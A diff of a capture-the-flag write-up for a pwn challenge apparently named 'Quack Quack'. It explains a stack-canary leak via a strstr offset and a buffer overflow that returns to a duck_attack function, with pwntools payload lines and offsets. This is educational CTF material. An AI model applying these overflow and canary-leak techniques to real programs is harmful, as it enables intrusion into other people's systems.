@@ -89,25 +89,35 @@ unsigned __int64 duck_attack()
 
 ### Debugging 
 
-Now, to prove all this theory we can check the debugging. Running the program and adding 8 "A". After `read`, we see the status of `$rsi`.
-
-```gdb
-pwndbg> x/20gx $rsi
-0x7fffffffdd80:	0x4141414141414141	0x000000000000000a // 0x10
-0x7fffffffdd90:	0x0000000000000000	0x0000000000000000 // 0x20
-0x7fffffffdda0:	0x0000000000000000	0x0000000000000000 // 0x30
-0x7fffffffddb0:	0x0000000000000000	0x0000000000000000 // 0x40
-0x7fffffffddc0:	0x0000000000000000	0x0000000000000000 // 0x50
-0x7fffffffddd0:	0x0000000000000000	0x0000000000000000 // 0x60
-0x7fffffffdde0:	0x0000000000000000	0x0000000000000000 // 0x70
-0x7fffffffddf0:	0x0000000000000000	0x5c9f27b935a3ab00 // 0x80
-0x7fffffffde00:	0x00007fffffffde20	0x000000000040162a
-0x7fffffffde10:	0x0000000000000000	0x5c9f27b935a3ab00
+Now, to prove all this theory we can check the debugging. 
+```
+Địa chỉ cao    +----------------+
+               | Địa chỉ trở về |
+        rbp -> +----------------+
+               |Canary[rbp-0x8] |  <-- v4
+               +----------------+
+               |                |
+               |     .....      |  (các biến khác, padding)
+               |                |
+               +----------------+
+               |                |
+               |   buf[rbp-0x80]    |  <-- buf[4] bắt đầu từ [rbp-0x80]
+               |                |
+               +----------------+
+               |                |
+        rsp -> +----------------+
+Địa chỉ thấp
 ```
 ![image](https://github.com/user-attachments/assets/543c1298-bbd7-4150-92b8-1616e78584cb)
 
-We see that the canary lies at `0x80` from the start of the buffer. As we can leak up to `0x20` bytes, we can find out that we leak the canary address (7 bytes and adding the last 0 due to `read`) at `0x71` bytes.
-
+So the distance between Canary and buf is `0x80-0x8 = 0x78` bytes. But, to override the Canary, we need one more byte so need to pass 121 bytes to get Canary leak.
+And then `\x00` is overrided which is the last byte of canary.
+```c
+  v1 = strstr((const char *)buf, "Quack Quack ");
+  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
+```
+Thus, `v1+32=121' and  v1 is the first letter that is found from input. 
+So we need to send `89*'A' + "Quack Quack "(12 bytes) = total 101 bytes = 0x65`
 ```python
 r.sendlineafter('> ', b'A'* (0x65 - len('Quack Quack ')) + b'Quack Quack ')
 
@@ -116,26 +126,12 @@ r.recvuntil('Quack Quack ')
 canary = u64(r.recv(7).rjust(8, b'\x00'))
 ```
 
-After that, we need to calculate where we start to write our second input and check the `canary` and `return address` offsets.
-
-```gdb
-pwndbg> x/20gx $rsi
-0x7fffffffdda0:	0x0000000a42424242	0x0000000000000000 // 0x10
-0x7fffffffddb0:	0x0000000000000000	0x0000000000000000 // 0x20
-0x7fffffffddc0:	0x0000000000000000	0x0000000000000000 // 0x30
-0x7fffffffddd0:	0x0000000000000000	0x0000000000000000 // 0x40
-0x7fffffffdde0:	0x0000000000000000	0x0000000000000000 // 0x50
-0x7fffffffddf0:	0x0000000000000000	0x4d559fb679f97c00 // 0x60
-0x7fffffffde00:	0x00007fffffffde20	0x000000000040162a
-0x7fffffffde10:	0x0000000000000000	0x4d559fb679f97c00
-0x7fffffffde20:	0x0000000000000001	0x00007ffff7c29d90
-0x7fffffffde30:	0x0000000000000000	0x0000000000401605
-```
-
-We see that the `canary` is at `0x58` bytes from the start of the second buffer. Then a dummy address and then the `return address`. Knowing all this and the address of `duck_attack()`, we can craft our exploit.
-
-# Solution
+After have Canary value, we calculate the distance between the second input and the canary as the previous one.
+`0x60-0x8= 88 bytes`. This time we dont need to plus 1 byte because we have the canary value.
+So the payload is ``88*'A' + Canary + 8 bytes (save rbp) + return address(duck_attack)`.
 
 
-Flag --> HTB{XXX}
+# Result
+![image](https://github.com/user-attachments/assets/60d16b42-810e-4b92-acc2-8eedfdfa18f2)
+
 
